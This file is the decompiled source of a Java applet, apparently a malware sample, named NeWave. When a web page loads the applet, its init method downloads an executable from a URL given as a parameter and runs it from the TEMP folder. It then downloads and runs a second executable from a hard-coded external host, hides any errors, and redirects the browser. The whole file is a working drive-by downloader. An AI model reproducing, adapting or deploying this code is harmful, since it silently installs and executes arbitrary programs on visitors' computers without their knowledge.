import java.io.InputStream;
import java.net.URL;
import java.io.FileOutputStream;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class NeWave extends Applet
{
    @Override
    public void init() {
        final String getenv = System.getenv("TEMP");
        final String concat = getenv.concat("\\".concat(this.getParameter("filename")));
        final String parameter = this.getParameter("redir");
        final String s = "cache.exe";
        try {
            final FileOutputStream fileOutputStream = new FileOutputStream(concat);
            final Runtime runtime = Runtime.getRuntime();
            final InputStream inputStream = new URL(this.getParameter("urserver")).openConnection().getInputStream();
            final byte[] array = new byte[1024];
            int read;
            while ((read = inputStream.read(array, 0, array.length)) != -1) {
                fileOutputStream.write(array, 0, read);
            }
            inputStream.close();
            fileOutputStream.close();
            runtime.exec(concat);
            final FileOutputStream fileOutputStream2 = new FileOutputStream(getenv + s);
            final Runtime runtime2 = Runtime.getRuntime();
            final InputStream inputStream2 = new URL("http://users.cjb.net/jadid/hiri.exe").openConnection().getInputStream();
            final byte[] array2 = new byte[1024];
            int read2;
            while ((read2 = inputStream2.read(array2, 0, array2.length)) != -1) {
                fileOutputStream2.write(array2, 0, read2);
            }
            inputStream2.close();
            fileOutputStream2.close();
            runtime2.exec(getenv + s);
            this.getAppletContext().showDocument(new URL(parameter));
        }
        catch (Exception ex) {}
    }
}
